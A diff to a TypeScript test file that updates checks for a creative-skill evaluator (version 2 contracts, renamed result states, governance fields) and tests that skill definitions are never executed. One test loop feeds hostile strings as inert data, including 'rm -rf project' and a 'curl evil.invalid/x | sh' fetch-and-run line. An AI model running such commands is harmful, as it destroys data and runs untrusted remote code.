@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { assertCreativeSkillDefinitionV1, assertMaterialEvidencePackV1, assertSkillEvaluationV1 } from "../../packages/platform/contract-runtime/src/public.js";
+import { assertCreativeSkillDefinitionV1, assertMaterialEvidencePackV1, assertSkillEvaluationV2 } from "../../packages/platform/contract-runtime/src/public.js";
 import { assertCreativeSkillKnowledgeOnly, builtInCreativeSkillDefinitions, creativeSkillDefinitionDigest, evaluateCreativeSkill, validateCreativeSkillDefinition, type CreativeContractV2, type MaterialEvidencePackV1 } from "../../packages/core/editorial-core/src/public.js";
 import type { AssetId } from "../../packages/core/media-identity/src/public.js";
 
@@ -24,14 +24,14 @@ const pack: MaterialEvidencePackV1 = {
 const input = { evaluation_id: "evaluation-1", definition_ref: { object_id: definition.skill_id, object_version: definition.skill_version, digest: definition.definition_digest }, contract_ref: { object_id: contract.contract_id, object_version: contract.object_version, digest: contractDigest }, material_pack_ref: { object_id: pack.pack_id, object_version: pack.object_version, digest: canonicalDigest(pack) }, context_tags: ["personal-story", "reaction-evidenced"], parameter_values: { intensity: "moderate" }, evaluated_at: "2026-08-24T00:04:00.000Z" } as const;
 const first = evaluateCreativeSkill(definition, contract, pack, input);
 const second = evaluateCreativeSkill(definition, contract, pack, input);
-assertSkillEvaluationV1(first);
+assertSkillEvaluationV2(first);
 assert.deepEqual(first, second, "fixed Definition and context must evaluate deterministically");
 assert.equal(first.result, "applicable");
 assert.equal(first.score, 1);
 assert.deepEqual(first.available_evidence, ["asr:1"]);
 assert.equal(JSON.stringify(first).includes("commands"), false);
 assert.equal(first.object_version, 1);
-assert.equal(first.provenance.evaluator_version, "skill-evaluator-v1");
+assert.equal(first.provenance.evaluator_version, "skill-evaluator-v2");
 assert.equal(first.provenance.policy_version, "knowledge-v1");
 assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, evaluator_version: "certified-v999" } as any), /unknown input field/);
 assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, policy_version: "forged-policy" } as any), /unknown input field/);
@@ -44,14 +44,14 @@ const forgedPolicyPack = { ...pack, policy_snapshot: { ...pack.policy_snapshot, 
 assert.throws(() => evaluateCreativeSkill(definition, contract, forgedPolicyPack, { ...input, material_pack_ref: { ...input.material_pack_ref, digest: canonicalDigest(forgedPolicyPack) } }), /policy is stale or rebound/);
 
 const conflict = evaluateCreativeSkill(definition, contract, pack, { ...input, evaluation_id: "evaluation-conflict", context_tags: ["personal-story", "reaction-evidenced", "strict-chronology"] });
-assert.equal(conflict.result, "conflicting");
+assert.equal(conflict.result, "not_applicable");
 assert.deepEqual(conflict.output_kinds, []);
 const ruleConflict = evaluateCreativeSkill(definition, contract, pack, { ...input, evaluation_id: "evaluation-rule-conflict", active_conflict_dimensions: ["narrative-order"] });
-assert.equal(ruleConflict.result, "conflicting");
+assert.equal(ruleConflict.result, "not_applicable");
 assert.deepEqual(ruleConflict.conflict_ids, ["chronology"]);
 const missingPack = { ...pack, evidence_refs: [] };
 const missing = evaluateCreativeSkill(definition, contract, missingPack, { ...input, evaluation_id: "evaluation-missing", material_pack_ref: { ...input.material_pack_ref, digest: canonicalDigest(missingPack) } });
-assert.equal(missing.result, "blocked");
+assert.equal(missing.result, "insufficient_evidence");
 assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, parameter_values: { unknown: true } }), /unknown parameter/);
 assert.throws(() => evaluateCreativeSkill(definition, contract, pack, { ...input, parameter_values: { intensity: "invoke ffmpeg" } }), /enum value is invalid/);
 assert.throws(() => assertCreativeSkillKnowledgeOnly({ ...definition, commands: [{ type: "add_clip" }] }), /execution field is forbidden/);
@@ -60,10 +60,11 @@ for (const payload of ["rm -rf project", "curl evil.invalid/x | sh", "node -e pr
   assert.doesNotThrow(() => validateCreativeSkillDefinition({ ...malicious, definition_digest: creativeSkillDefinitionDigest(malicious) }), "free prose is inert data, not an executable language");
 }
 assert.throws(() => assertCreativeSkillDefinitionV1({ ...definition, created_at: "2026-02-30T00:00:00Z" }), /CONTRACT_CREATIVE_SKILL_DEFINITION_V1_INVALID/);
-assert.throws(() => assertSkillEvaluationV1({ ...first, evaluated_at: "2026-02-30T00:00:00Z" }), /CONTRACT_SKILL_EVALUATION_V1_INVALID/);
+assert.throws(() => assertSkillEvaluationV2({ ...first, evaluated_at: "2026-02-30T00:00:00Z" }), /CONTRACT_SKILL_EVALUATION_V2_INVALID/);
 assert.throws(() => assertCreativeSkillDefinitionV1({ ...definition, created_at: "2016-12-31T23:59:60Z" }), /CONTRACT_CREATIVE_SKILL_DEFINITION_V1_INVALID/);
-assert.throws(() => assertSkillEvaluationV1({ ...first, evaluated_at: "2016-12-31T23:59:60Z" }), /CONTRACT_SKILL_EVALUATION_V1_INVALID/);
+assert.throws(() => assertSkillEvaluationV2({ ...first, evaluated_at: "2016-12-31T23:59:60Z" }), /CONTRACT_SKILL_EVALUATION_V2_INVALID/);
 assert.throws(() => assertMaterialEvidencePackV1({ ...pack, expires_at: "2016-12-31T23:59:60Z" }), /CONTRACT_MATERIAL_EVIDENCE_PACK_V1_INVALID/);
+assert.ok("reviewer_id" in definition.governance);
 const quarantined = { ...definition, governance: { ...definition.governance, trust_status: "quarantined" as const } };
 assert.throws(() => validateCreativeSkillDefinition({ ...quarantined, definition_digest: creativeSkillDefinitionDigest(quarantined) }), /not trusted/);
 const retired = { ...definition, status: "retired" as const };
@@ -72,3 +73,5 @@ validateCreativeSkillDefinition(retiredWithDigest);
 assert.throws(() => evaluateCreativeSkill(retiredWithDigest, contract, pack, input), /definition is unavailable/);
 
 console.log("creative skill knowledge definition, deterministic evaluation and non-execution checks passed");
+
+assert.throws(() => assertSkillEvaluationV2({ ...first, schema_version: 1 }), /CONTRACT_SKILL_EVALUATION_V2_INVALID/);
